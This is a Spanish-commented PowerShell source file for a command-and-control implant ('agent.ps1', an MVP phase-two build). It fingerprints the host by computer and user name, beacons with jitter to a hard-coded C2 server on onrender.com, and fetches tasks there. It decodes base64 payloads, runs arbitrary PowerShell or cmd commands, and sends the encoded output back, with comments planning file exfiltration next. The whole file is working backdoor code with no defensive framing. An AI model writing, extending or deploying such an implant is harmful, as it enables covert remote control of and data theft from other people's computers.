# agent.ps1 (MVP Fase 2 - core_services_mvp2.ps1)
# Agente con bucle de tareas, ejecución de comandos y envío de resultados.

# --- CONFIGURACIÓN ---
$c2BaseUrl = "https://exa-sw-fr2c.onrender.com" # URL actualizada de tu C2 en Render
$InitialSleepSeconds = 10 # Tiempo de espera inicial antes del primer beacon/solicitud de tarea
$LoopSleepSecondsBase = 60 # Tiempo base de espera entre solicitudes de tarea
$JitterPercentage = 0.3 # 30% de jitter
# --------------------

$agentId = try {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $rawAgentId = "$($computerName)_$($userName)"
    $cleanedAgentId = $rawAgentId -replace '[^a-zA-Z0-9_-]', '' 
    if ([string]::IsNullOrWhiteSpace($cleanedAgentId)) { "UnknownAgent_F2_$(Get-Random)" } else { $cleanedAgentId }
} catch {
    "UnknownAgent_F2_$(Get-Random)" 
}

# Función para enviar datos al C2 (POST JSON)
function Send-DataToC2 {
    param(
        [string]$UriPath,
        [object]$Data
    )
    $fullUrl = "$($c2BaseUrl)$($UriPath)"
    try {
        # Write-Host "DEBUG: Enviando datos a $fullUrl : $($Data | ConvertTo-Json -Depth 5)"
        Invoke-RestMethod -Uri $fullUrl -Method Post -Body ($Data | ConvertTo-Json -Depth 5) -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing
    } catch {
        Write-Warning "Error enviando datos a $fullUrl : $($_.Exception.Message)"
    }
}

# Función para obtener tareas del C2
function Get-TaskFromC2 {
    param(
        [string]$AgentIdParam
    )
    $taskUrl = "$($c2BaseUrl)/api/tasks/$($AgentIdParam)/get"
    try {
        # Write-Host "DEBUG: Solicitando tarea desde $taskUrl"
        $response = Invoke-RestMethod -Uri $taskUrl -Method Get -TimeoutSec 30 -UseBasicParsing
        return $response
    } catch {
        Write-Warning "Error obteniendo tarea desde $taskUrl : $($_.Exception.Message)"
        return $null
    }
}

# Beacon inicial (opcional, ya que el C2 ahora crea la cola al primer /gettask o /updates)
# $beaconUrl = "$($c2BaseUrl)/api/updates?uid=$($agentId)&phase=mvp2_agent_active_render"
# try {
#     Write-Host "Enviando beacon inicial a: $beaconUrl"
#     Invoke-RestMethod -Uri $beaconUrl -Method Get -TimeoutSec 10 -UseBasicParsing
# } catch {
#     Write-Warning "Error enviando beacon inicial: $($_.Exception.Message)"
# }

# Pausa inicial
Start-Sleep -Seconds $InitialSleepSeconds

# Bucle principal del agente
while ($true) {
    $task = Get-TaskFromC2 -AgentIdParam $agentId
    
    if ($null -ne $task -and $task.command -ne "sleep") {
        # Write-Host "DEBUG: Tarea recibida: $($task | ConvertTo-Json -Depth 3)"
        $output = ""
        $errorOutput = ""
        $taskResult = @{
            task_id = $task.task_id
            status = "completed" # Asumir completado, cambiar si hay error
            output = ""
        }

        try {
            $commandToExecute = $task.command
            if ($task.payload_b64) {
                try {
                    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task.payload_b64))
                    # Si el comando es algo como 'upload', el payload es la ruta. Para otros, podría ser parte del comando.
                    # Por ahora, asumimos que si hay payload, es parte del comando o un argumento.
                    # Esto necesitará más lógica si 'command' es genérico y 'type' dicta cómo usar payload.
                    # Para MVP2, si el comando es 'powershell' o 'cmd', y hay payload, lo añadimos.
                    # Si el comando es, por ejemplo, 'exfiltrate_file', el payload_b64 sería la RUTA del archivo.
                    # La lógica de ejecución de tarea se refinará en Fase 3 para exfiltración.
                    if ($task.type -eq "powershell_b64" -or $task.type -eq "cmd_b64") {
                        $commandToExecute = $decodedPayload
                    } elseif ($task.command -match "placeholder_for_payload") { # Ejemplo si el comando tiene un marcador
                        $commandToExecute = $task.command -replace "placeholder_for_payload", $decodedPayload
                    }
                    # Para un simple 'whoami' o 'hostname', payload_b64 no se usaría directamente en la ejecución.
                } catch {
                    $errorOutput += "Error decodificando payload_b64: $($_.Exception.Message)`n"
                    $taskResult.status = "error_decoding_payload"
                }
            }
            
            if ($taskResult.status -ne "error_decoding_payload") {
                if ($task.type -eq "powershell" -or $task.type -eq "powershell_b64") {
                    # Write-Host "DEBUG: Ejecutando PowerShell: $commandToExecute"
                    $scriptBlock = [Scriptblock]::Create($commandToExecute)
                    $output = Invoke-Command -ScriptBlock $scriptBlock 2>&1 | Out-String
                } elseif ($task.type -eq "cmd" -or $task.type -eq "cmd_b64") {
                    # Write-Host "DEBUG: Ejecutando CMD: $commandToExecute"
                    $output = cmd.exe /c "$commandToExecute" 2>&1 | Out-String
                } else {
                    $output = "Tipo de comando desconocido: $($task.type)"
                    $taskResult.status = "unknown_command_type"
                }
            }
        } catch {
            $errorOutput += "Error ejecutando comando: $($_.Exception.Message)`n$($_.ScriptStackTrace)"
            $taskResult.status = "execution_error"
        }
        
        # Combinar stdout y stderr (si existe)
        if (-not [string]::IsNullOrWhiteSpace($errorOutput)) {
            $output = if (-not [string]::IsNullOrWhiteSpace($output)) { "$($output)`n---ERRORS---`n$($errorOutput)" } else { $errorOutput }
        }
        
        $taskResult.output = try { [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output)) } catch { "Error_Encoding_Output_To_Base64" }
        
        # Enviar resultado
        # Write-Host "DEBUG: Enviando resultado: $($taskResult | ConvertTo-Json -Depth 3)"
        Send-DataToC2 -UriPath "/api/results/$($agentId)/send" -Data $taskResult
        
    } else {
        # Write-Host "DEBUG: No hay tarea o es 'sleep'."
    }

    # Calcular jitter y dormir
    $jitter = Get-Random -Minimum (-$LoopSleepSecondsBase * $JitterPercentage) -Maximum ($LoopSleepSecondsBase * $JitterPercentage)
    $actualSleep = [int]($LoopSleepSecondsBase + $jitter)
    if ($actualSleep -lt 5) { $actualSleep = 5 } # Mínimo de 5 segundos de sleep
    # Write-Host "DEBUG: Durmiendo por $actualSleep segundos."
    Start-Sleep -Seconds $actualSleep
}
